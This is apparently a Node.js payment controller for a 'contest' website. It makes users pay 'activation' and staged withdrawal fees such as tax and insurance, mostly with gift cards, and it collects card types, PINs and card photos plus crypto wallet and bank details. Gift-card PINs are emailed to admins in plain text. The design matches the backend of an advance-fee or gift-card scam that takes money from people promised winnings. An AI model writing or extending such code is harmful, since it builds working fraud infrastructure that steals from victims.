const User = require('../models/User');
const Withdrawal = require('../models/Withdrawal');
const { sendAdminEmail } = require('../utils/mailer');
const { uploadToCloudinary } = require('../utils/cloudinary');

/**
 * Handles activation/payment submission:
 * - legacy single activation: method: 'giftcard' | 'crypto' | 'bank'
 *   expects file uploaded under 'giftImage' (legacy) or 'file' (fallback).
 *
 * - new stage/withdrawal submission:
 *   expects fields:
 *     withdrawalId, stage, amount, cardsCount
 *   and for each card index i:
 *     cards[${i}][giftCard], cards[${i}][pin], file field name: cards[${i}][file]
 *   multer is expected to be used with upload.any(), so req.files is an array.
 */
async function submitActivationPayment(req, res) {
  try {
    const { method, withdrawalId, stage, amount } = req.body;
    const userId = req.user && req.user.id;
    if (!userId) return res.status(401).json({ message: 'Unauthorized' });

    const user = await User.findById(userId);
    if (!user) return res.status(404).json({ message: 'User not found' });

    // Convert req.files (array) into a map by fieldname for easy lookup
    const filesByField = {};
    if (Array.isArray(req.files)) {
      req.files.forEach((f) => {
        // If multiple files have same fieldname, keep an array
        if (!filesByField[f.fieldname]) filesByField[f.fieldname] = [];
        filesByField[f.fieldname].push(f);
      });
    }

    // If a withdrawalId or stage is present -> this is the stage payment flow (Tax, Insurance, etc.)
    if (withdrawalId || stage) {
      // Withdraw-stage submission: parse cards from form-data
      const withdrawal = await Withdrawal.findById(withdrawalId);
      if (!withdrawal) return res.status(404).json({ message: 'Withdrawal not found' });
      if (String(withdrawal.user) !== String(userId)) return res.status(403).json({ message: 'Forbidden' });

      const cards = [];
      const cardsCount = Number(req.body['cardsCount'] || 0);

      if (cardsCount && cardsCount > 0) {
        for (let i = 0; i < cardsCount; i++) {
          const giftCard = req.body[`cards[${i}][giftCard]`] || req.body[`cards[${i}][gift]`] || 'Steam';
          const pin = req.body[`cards[${i}][pin]`] || '';
          const fileField = `cards[${i}][file]`;
          const fileArr = filesByField[fileField];
          const file = fileArr && fileArr.length ? fileArr[0] : null;
          
          let cloudinaryResult = null;
          if (file) {
            try {
              cloudinaryResult = await uploadToCloudinary(file, 'contest-giftcards');
            } catch (uploadError) {
              console.error(`Cloudinary upload failed for card ${i}:`, uploadError);
            }
          }
          
          // Store Cloudinary URL instead of local path
          const savedFile = cloudinaryResult ? { 
            filename: file.originalname, 
            originalname: file.originalname, 
            url: cloudinaryResult.secure_url,
            public_id: cloudinaryResult.public_id
          } : null;
          
          cards.push({ giftCard, pin, file: savedFile });
        }
      } else {
        // fallback single-card fields (legacy single upload)
        const giftCard = req.body.giftCard || req.body.cardType || 'Steam';
        const pin = req.body.cardPin || req.body.pin || '';
        // try several possible file field names
        const possibleFields = ['file', 'giftImage', 'cardImage', 'image', 'upload'];
        let file = null;
        for (const f of possibleFields) {
          if (filesByField[f] && filesByField[f].length) { file = filesByField[f][0]; break; }
        }
        // last-resort: take first file in req.files
        if (!file && Array.isArray(req.files) && req.files.length) file = req.files[0];
        
        let cloudinaryResult = null;
        if (file) {
          try {
            cloudinaryResult = await uploadToCloudinary(file, 'contest-giftcards');
          } catch (uploadError) {
            console.error(`Cloudinary upload failed:`, uploadError);
          }
        }
        
        // Store Cloudinary URL instead of local path
        const savedFile = cloudinaryResult ? { 
          filename: file.originalname, 
          originalname: file.originalname, 
          url: cloudinaryResult.secure_url,
          public_id: cloudinaryResult.public_id
        } : null;
        
        cards.push({ giftCard, pin, file: savedFile });
      }

      // Build stage payment submission with consistent structure
      const paymentSubmission = {
        method: 'giftcard',
        stage: stage || 'activation',
        amount: Number(amount) || 0,
        details: {
          cards: cards
        },
        cards: cards, // Also keep at top level for backward compatibility
        createdAt: new Date(),
        status: 'submitted'
      };

      // Save to withdrawal.payments
      if (!withdrawal.payments) withdrawal.payments = [];
      withdrawal.payments.push(paymentSubmission);
      await withdrawal.save();

      // Also add to user's payments for admin overview - use same structure
      if (!user.payments) user.payments = [];
      const userPaymentRecord = { 
        ...paymentSubmission, 
        withdrawal: withdrawal._id 
      };
      user.payments.push(userPaymentRecord);
      await user.save();

      // Build admin email body with card details
      let detailsStr = `User ${user.username} submitted payment for stage ${paymentSubmission.stage} (withdrawal: ${withdrawalId}).\n\n`;
      detailsStr += `Amount: $${paymentSubmission.amount}\n`;
      detailsStr += `Stage: ${paymentSubmission.stage}\n\n`;
      detailsStr += `Gift Cards Details:\n`;
      detailsStr += '─'.repeat(50) + '\n';
      
      cards.forEach((c, idx) => {
        detailsStr += `Card ${idx + 1}:\n`;
        detailsStr += `  Type: ${c.giftCard || 'N/A'}\n`;
        detailsStr += `  PIN: ${c.pin || 'Not provided'}\n`;
        if (c.file) {
          detailsStr += `  Image URL: ${c.file.url}\n`;
          detailsStr += `  Filename: ${c.file.filename}\n`;
        } else {
          detailsStr += `  Image: No image uploaded\n`;
        }
        detailsStr += '\n';
      });

      detailsStr += `Submitted at: ${new Date().toLocaleString()}\n`;
      detailsStr += `User: ${user.username} (${user.email || 'No email'})`;

      sendAdminEmail(`Stage ${paymentSubmission.stage} payment submitted - ${user.username}`, detailsStr);

      // Notify admin users in-app
      try {
        const admins = await User.find({ role: 'admin' });
        await Promise.all(admins.map(async (a) => {
          a.notifications.push({ 
            text: `User ${user.username} submitted ${paymentSubmission.stage} payment with ${cards.length} gift card(s).`, 
            createdAt: new Date() 
          });
          await a.save();
        }));
      } catch (e) {
        console.error('Failed to notify admins in-app', e);
      }

      return res.json({ message: 'Submitted' });
    }

    // Otherwise, legacy single activation payment flow (method required)
    if (!method) return res.status(400).json({ message: 'Payment method required' });

    // For legacy activation flow, create cards array to maintain consistent structure
    const cards = [];
    let cardDetails = {};

    if (method === 'giftcard') {
      const cardType = req.body.cardType || req.body.giftCard || 'Steam';
      const cardPin = req.body.cardPin || req.body.pin || '';
      
      // with upload.any() the file may be in req.files (array) not req.file
      let file = null;
      if (req.file) file = req.file;
      else if (filesByField['giftImage'] && filesByField['giftImage'].length) file = filesByField['giftImage'][0];
      else if (filesByField['file'] && filesByField['file'].length) file = filesByField['file'][0];
      else if (Array.isArray(req.files) && req.files.length) file = req.files[0];

      let cloudinaryResult = null;
      if (file) {
        try {
          cloudinaryResult = await uploadToCloudinary(file, 'contest-giftcards');
        } catch (uploadError) {
          console.error(`Cloudinary upload failed:`, uploadError);
        }
      }
      
      // Store Cloudinary URL instead of local path
      const savedFile = cloudinaryResult ? { 
        filename: file.originalname, 
        originalname: file.originalname, 
        url: cloudinaryResult.secure_url,
        public_id: cloudinaryResult.public_id
      } : null;
      
      // Create card for consistent structure
      cards.push({ 
        giftCard: cardType, 
        pin: cardPin, 
        file: savedFile 
      });

      cardDetails = {
        cardType: cardType,
        cardPin: cardPin,
        image: savedFile ? savedFile.url : 'No image uploaded',
        cards: cards // Include cards array for consistency
      };
    } else if (method === 'crypto') {
      cardDetails = {
        crypto: req.body.crypto,
        walletAddress: req.body.walletAddress
      };
    } else if (method === 'bank') {
      cardDetails = {
        bankName: req.body.bankName,
        accountNumber: req.body.accountNumber,
        firstName: req.body.firstName,
        lastName: req.body.lastName,
        email: req.body.email
      };
    } else {
      return res.status(400).json({ message: 'Unknown payment method' });
    }

    // Create payment with consistent structure
    const payment = { 
      method, 
      details: cardDetails,
      cards: cards, // Include cards array for consistency
      createdAt: new Date(), 
      status: 'submitted' 
    };

    // Save to user.payments (legacy activation payments)
    user.payments.push(payment);
    await user.save();

    // Build a helpful admin email body showing card type & pin & image
    let emailBody = `User ${user.username} submitted activation payment via ${method}.\n\n`;
    emailBody += `Complete Details:\n`;
    emailBody += '─'.repeat(40) + '\n';
    
    if (method === 'giftcard') {
      emailBody += `Card type: ${cardDetails.cardType}\n`;
      emailBody += `Card PIN: ${cardDetails.cardPin || 'Not provided'}\n`;
      emailBody += `Image URL: ${cardDetails.image}\n`;
      if (cards[0] && cards[0].file && cards[0].file.filename) {
        emailBody += `Filename: ${cards[0].file.filename}\n`;
      }
    } else if (method === 'crypto') {
      emailBody += `Crypto: ${cardDetails.crypto}\n`;
      emailBody += `Wallet: ${cardDetails.walletAddress}\n`;
    } else if (method === 'bank') {
      emailBody += `Bank: ${cardDetails.bankName}\n`;
      emailBody += `Account: ${cardDetails.accountNumber}\n`;
      emailBody += `Name: ${cardDetails.firstName} ${cardDetails.lastName}\n`;
      emailBody += `Email: ${cardDetails.email}\n`;
    }
    
    emailBody += `\nSubmitted at: ${new Date().toLocaleString()}`;

    // notify admin (email)
    sendAdminEmail(`New ${method} activation payment - ${user.username}`, emailBody);

    // Also notify admins in-app
    try {
      const admins = await User.find({ role: 'admin' });
      await Promise.all(admins.map(async (a) => {
        a.notifications.push({ 
          text: `User ${user.username} submitted an activation payment via ${method}.`, 
          createdAt: new Date() 
        });
        await a.save();
      }));
    } catch (e) {
      console.error('Failed to notify admins in-app', e);
    }

    return res.json({ message: 'Payment submitted', paymentId: user.payments[user.payments.length - 1]._id });
  } catch (err) {
    console.error('paymentController.submitActivationPayment err', err);
    res.status(500).json({ message: 'Server error' });
  }
}

module.exports = { submitActivationPayment };